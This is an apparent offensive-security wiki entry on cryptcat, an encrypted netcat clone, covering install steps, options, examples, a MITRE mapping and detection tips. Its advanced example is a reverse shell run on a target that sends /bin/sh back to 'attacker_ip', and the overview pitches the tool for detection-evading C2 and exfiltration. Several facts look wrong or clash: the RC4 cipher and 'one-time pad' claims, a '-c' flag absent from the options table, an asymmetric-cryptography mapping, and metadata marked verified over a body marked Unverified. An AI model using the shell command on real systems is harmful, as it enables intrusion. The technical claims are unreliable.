---
id: 626b9465-d176-41bf-b039-0c7b99de85e0
type: tool
verified: true
created_at: '2019-08-28T21:17:40.608127+00:00'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - Linux
  - Unix
tags:
  - network
  - encryption
  - post-exploitation
  - tunnel
url: 'https://sourceforge.net/projects/cryptcat/'
validated: true
---

# cryptcat

**Status**: Unverified

## Overview

Cryptcat is a lightweight network utility similar to netcat (nc), but with built-in encryption for data transmission over TCP or UDP connections. It uses a shared password to derive an RC4 encryption key, making it useful for secure command-and-control (C2) channels, reverse shells, or data exfiltration in offensive security operations where traffic must evade basic detection.

## Description

Cryptcat reads from standard input and writes to standard output, facilitating network connections while encrypting all transmitted data. It supports both client and server modes, allowing for bind shells, reverse shells, file transfers, and port forwarding. The encryption (symmetric RC4) protects against passive eavesdropping but is not quantum-resistant or highly secure by modern standards—use for testing environments only. Common in red teaming for encrypted backdoors without relying on external tools like SSH.

## Features

- Feature 1: Symmetric encryption with password-based key derivation (RC4 stream cipher)
- Feature 2: TCP and UDP protocol support for flexible networking
- Feature 3: Bind and reverse shell capabilities with executable piping (e.g., -e /bin/sh)
- Feature 4: One-time pad mode for added security in sensitive transfers
- Feature 5: Scriptable integration for automation in pentesting workflows

## Installation

### Requirements

- GCC compiler (for building from source)
- Unix-like system (Linux, BSD, macOS)

### Install Commands

```bash
# Download from SourceForge
wget https://sourceforge.net/projects/cryptcat/files/cryptcat-2.0.tar.gz/download -O cryptcat-2.0.tar.gz

tar -xzf cryptcat-2.0.tar.gz
cd cryptcat-2.0

# Compile
make
# Or directly
gcc cryptcat.c -o cryptcat

# Install to PATH (optional)
sudo cp cryptcat /usr/local/bin/
```

On Kali Linux, it may be available via apt or custom repos, but building from source is recommended for the latest version.

## Basic Usage

```bash
cryptcat -h
```
This displays help with all options, including encryption modes and connection types.

### Common Options

| Option | Description |
|--------|-------------|
| -l | Listen mode (server) |
| -p | Specify port |
| -k | Set encryption password |
| -e | Execute command on connect (e.g., /bin/sh) |
| -d | Daemon mode (background) |
| -K | Use one-time pad file for encryption |

## Examples

### Example 1: Basic Usage

Create a listener:

```bash
cryptcat -l -p 4444 -k mykey
```

Connect from another host:

```bash
cryptcat 192.168.1.100 4444 -k mykey
```

### Example 2: Advanced Usage

Encrypted reverse shell (run on target):

```bash
cryptcat -c attacker_ip 4444 -k mykey -e /bin/sh
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Asymmetric Cryptography]] Encrypted Channel: Asymmetric Cryptography (adapted for symmetric use in C2)
- [[Standard Non-Application Layer Protocol]] Non-Application Layer Protocol (TCP/UDP with encryption)

### Tactics

- [[Command and Control]] Command and Control
- [[Privilege Escalation]] Privilege Escalation (via shells)

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Unusual encrypted TCP/UDP traffic on non-standard ports (e.g., monitor with Wireshark for RC4 patterns or entropy analysis)
- Detection method 2: Process monitoring for cryptcat binaries or unusual child processes (e.g., /bin/sh spawned from network connections)
- Detection method 3: Network behavioral analysis—look for symmetric encrypted streams without TLS/SSH handshakes
- Detection method 4: File integrity checks for unauthorized binaries in /tmp or /usr/local/bin

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Netcat]] (unencrypted counterpart)
- [[tools/socat]] (advanced networking with encryption options)

## References

- Official SourceForge project: https://sourceforge.net/projects/cryptcat/
- Man page and source code analysis for custom builds
- Related: Netcat documentation for syntax similarities
